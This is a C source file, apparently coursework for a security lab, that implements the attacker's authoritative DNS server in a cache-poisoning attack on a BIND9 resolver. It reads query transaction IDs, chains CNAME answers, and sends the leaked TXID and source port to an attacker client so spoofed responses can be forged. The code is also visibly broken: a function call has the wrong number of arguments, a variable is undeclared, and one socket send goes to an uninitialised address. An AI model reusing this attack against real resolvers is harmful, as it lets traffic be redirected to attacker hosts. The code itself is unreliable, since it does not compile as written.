
#include <ldns/ldns.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SERVER_PORT 53 // Port for the attacker's authoritative server
#define BUFFER_SIZE 512
#define SERVER_CLIENT_PORT 4444
#define CLIENT_UDP_PORT 4443
#define CLIENT_IP "192.168.1.202"
#define BIND9_IP "192.168.1.203"
#define QUERY_DOMAIN "www.attacker.cybercourse.com"
// Function to create a DNS response packet

#include <ldns/ldns.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int send_txid(unsigned short txid);


int create_dns_response(int txid, const char* query_name) {
    ldns_pkt *packet = NULL;
    ldns_rr *question_rr = NULL;
    ldns_rr *answer_rr = NULL;

    // Step 1: Create a new DNS packet
    packet = ldns_pkt_new();
    if (!packet) {
        fprintf(stderr, "Failed to create a new packet.\n");
        return EXIT_FAILURE;
    }

    // Step 2: Set the Transaction ID (TXID) and flags
    ldns_pkt_set_id(packet, txid);   // Set the TXID
    ldns_pkt_set_qr(packet, true);  // Set QR (Query/Response) flag to Response

    // Step 3: Create the Question Section
    ldns_rdf *domain = ldns_dname_new_frm_str(QUERY_DOMAIN);
    if (!domain) {
        fprintf(stderr, "Failed to create domain RDF.\n");
        ldns_pkt_free(packet);
        return EXIT_FAILURE;
    }

    question_rr = ldns_rr_new();
    ldns_rr_set_owner(question_rr, domain);
    ldns_rr_set_type(question_rr, LDNS_RR_TYPE_CNAME);  // Query type: CNAME
    ldns_rr_set_class(question_rr, LDNS_RR_CLASS_IN);  // Query class: IN
    ldns_pkt_push_rr(packet, LDNS_SECTION_QUESTION, question_rr);

    // Step 4: Create the Answer Section using ldns_rr_new_frm_str
    char answer_rr_str[256];
    snprintf(answer_rr_str, sizeof(answer_rr_str), "%s 10 IN CNAME %s", QUERY_DOMAIN, query_name);

    if (ldns_rr_new_frm_str(&answer_rr, answer_rr_str, (uint8_t) 3600, domain, NULL) != LDNS_STATUS_OK) {
        fprintf(stderr, "Failed to create answer RR from string.\n");
        ldns_pkt_free(packet);
        ldns_rdf_deep_free(domain);
        return EXIT_FAILURE;
    }

    // Add the answer RR to the packet
    ldns_pkt_push_rr(packet, LDNS_SECTION_ANSWER, answer_rr);

    // Step 5: Serialize the packet for transmission
    uint8_t *wire_data = NULL;
    size_t wire_size = 0;

    if (ldns_pkt2wire(&wire_data, packet, &wire_size) != LDNS_STATUS_OK) {
        fprintf(stderr, "Failed to serialize packet.\n");
        ldns_pkt_free(packet);
        ldns_rdf_deep_free(domain);
        return EXIT_FAILURE;
    }

    // Step 6: Send the DNS response to the recursive resolver
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        ldns_pkt_free(packet);
        free(wire_data);
        ldns_rdf_deep_free(domain);
        return EXIT_FAILURE;
    }

    struct sockaddr_in resolver_addr;
    memset(&resolver_addr, 0, sizeof(resolver_addr));
    resolver_addr.sin_family = AF_INET;
    resolver_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, BIND9_IP, &resolver_addr.sin_addr);

    if (sendto(sockfd, wire_data, wire_size, 0, (struct sockaddr *)&resolver_addr, sizeof(resolver_addr)) < 0) {
        perror("Failed to send DNS response");
    } else {
        printf("Sent DNS response to resolver %s (TXID: %u).\n", BIND9_IP, txid);
    }

    // Step 7: Clean up
    printf("hello\n");
    close(sockfd);


    return 0;
}
//##########################################################################################################



// Function to send TXID and source port to the attacker’s client
void send_to_attacker_client(uint16_t txid, uint16_t source_port) {
    printf("send to attacker client\n");
    struct sockaddr_in client_addr;
    char message[64];

    // Create a UDP socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    // Configure the attacker’s client address
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(CLIENT_UDP_PORT); // Set port to 53
    if (inet_pton(AF_INET, CLIENT_IP, &client_addr.sin_addr) <= 0) {
        perror("Invalid attacker client IP address");
        close(sockfd);
        return;
    }

    // Prepare the message
    snprintf(message, sizeof(message), "TXID: %u, Source Port: %u", txid, source_port);
    

    // Send the message
    if (sendto(sockfd, message, strlen(message), 0, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        perror("Failed to send data to attacker’s client");
    } else {
        printf("Sent to attacker’s client: %s\n", message);
    }
    printf("finished sending to attacker client\n"); 
    close(sockfd);
}


int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter){

    // CHECK IF THE TXID IS ODD
    if (txid & 1){
        char response_n[30];
        sprintf(response_n, "ww%d.attacker.cybercourse.com", *counter);
        *counter += 1;
        create_dns_response(txid, response_n);
        return 0;
    }
    
    
    // check if the txid is even -> send TXID to the client
    else{
      uint16_t source_port = ntohs(client_addr.sin_port);
      printf("source port %u :\n", source_port);
      char* response_cname = "www.example.cybercourse.com";
      // Send the even txid to the client (send TXID)
      send_txid(txid);
      create_dns_response(txid, response_cname);
      return 1;
    } 
}



//####################################################################################################################

int send_txid(unsigned short txid){
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 2: Configure the server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Step 3: Bind the socket to the server address
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("UDP server listening on port %d...\n", SERVER_PORT);

    // while (1) {
        // // Step 4: Receive a request from the client
        // memset(buffer, 0, BUFFER_SIZE);
        // int received_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &client_addr_len);
        // if (received_len < 0) {
        //     perror("Failed to receive data");
        //     continue;
        // }

        // printf("Received request from client: %s\n", buffer);

        // Step 5: Send the TXID to the client
    snprintf(buffer, sizeof(buffer), "TXID: %hu", txid);

    if (sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&client_addr, client_addr_len) < 0) {
        perror("Failed to send data to client");
    } else {
        printf("Sent TXID to client: %hu\n", txid);
    }
    // }

    // Close the socket
    close(sockfd);
    return 0;
}


int main() {

    struct sockaddr_in server_addr, client_addr;
    char buffer[BUFFER_SIZE];
    socklen_t addr_len = sizeof(client_addr);


    // Create a UDP socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    memset(&server_addr, 0, sizeof(server_addr));
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    // Bind the socket to the server address
    int bind_res = bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if (bind_res < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    int counter = 0;
    printf("Authoritative name server running on port %d...\n", SERVER_PORT);
    int even_found = 0;
    // Receive a DNS query
    while (!even_found) {
        //client_addr will save the data of the sender, the received data will be saved in buffer
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &addr_len);
        if (n < 0 || n < 12) {
            printf("n < 12 \n");
            perror("Failed to receive data");
            continue;
        }

        // convert the data to a DNS packet
        ldns_pkt *query_pkt = NULL;
        if (ldns_wire2pkt(&query_pkt, (uint8_t *)buffer, n) != LDNS_STATUS_OK) {
            fprintf(stderr, "Failed to parse DNS query\n");
            continue;
        }

        // extract the txid
        uint16_t txid = ldns_pkt_id(query_pkt);
        printf("Received query with TXID: %u \n", txid);

        even_found = even_odd_part(txid, client_addr, &counter, client_sock);

  }
}
